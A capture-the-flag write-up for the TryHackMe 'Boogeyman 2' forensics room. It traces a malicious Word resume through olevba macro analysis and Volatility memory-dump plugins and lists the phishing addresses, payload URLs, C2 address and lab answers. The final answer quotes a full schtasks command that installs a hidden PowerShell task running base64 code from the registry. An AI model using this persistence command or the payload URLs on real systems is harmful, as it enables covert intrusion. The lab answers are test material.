Original Notes

Boogeyman 2 (THM)

Scenario

Maxine, a Human Resource Specialist working for Quick Logistics LLC, received an application from one of the open positions in the company. Unbeknownst to her, the attached resume was malicious and compromised her workstation.

The security team was able to flag some suspicious commands executed on the workstation of Maxine, which prompted the investigation. Given this, you are tasked to analyse and assess the impact of the compromise.

https://tryhackme.com/room/boogeyman2

1- What email was used to send the phishing email?

westaylor23@outlook.com

Fromfield

2- What is the email of the victim employee?

maxine.beck@quicklogisticsorg.onmicrosoft.com

Tofields

3- What is the name of the attached malicious document?

Resume_WesleyTaylor.doc

4- What is the MD5 hash of the malicious attachment?

52c4384a0b9e248b95804352ebec6c5b

save the attached word document and use md5sum

5- What URL is used to download the stage 2 payload based on the document's macro?

https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png

for this we will parse the file using olevba

olevba is a tool for parsing OLE and OpenXML files, such as Microsoft Office documents (e.g., Word, Excel). It can detect VBA macros, extract their source code in plain text, decode common malware obfuscation techniques (Hex, Base64, StrReverse, Dridex), and identify security-related patterns like auto-executable macros, suspicious VBA keywords, and potential IOCs (e.g., IP addresses, URLs, executable names).

6- What is the name of the process that executed the newly downloaded stage 2 payload?

wscript.exe

At the bottom of the output we will see the summary of what it uncovered and we can see it identified wscript.exe it the process that executes Javascript

7- What is the full file path of the malicious stage 2 payload?

C:\ProgramData\update.js

looking in the macro details we see that 1 payload is downloaded from the url in Q5 then it saved a javascript file and execute it using wscript.exe

8- What is the PID of the process that executed the stage 2 payload?

4260

for this we use volatility with pstreeplugin and grep for wscriptto see its pid

9- What is the parent PID of the process that executed the stage 2 payload?

1124

The result of the above command shows that WINWORD.EXE was the parent process

10- What URL is used to download the malicious binary executed by the stage 2 payload?

https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe

we assume that it might be the same domain from before (Q5) so we use strings and grep with the domain from before

11- What is the PID of the malicious process used to establish the C2 connection?

6216

using netscan plugin to see the network connections that were established and grep with “updater”

12- What is the full file path of the malicious process used to establish the C2 connection?

C:\Windows\Tasks\updater.exe

for this we use cmdline plugin

we can also find the answer using filescanor dlllistwith greping with the pid

13- What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)

128.199.95.189:8080

can see the answer from the netscan output in Q11

14- What is the full file path of the malicious email attachment based on the memory dump?

C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc

we use filscan plugin to search for file objects and grep with the attachment from Q3

15- The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?

schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"’

The full command can be identified by searching for strings containing schtasks, which is the CLI for Task Scheduler in Windows.
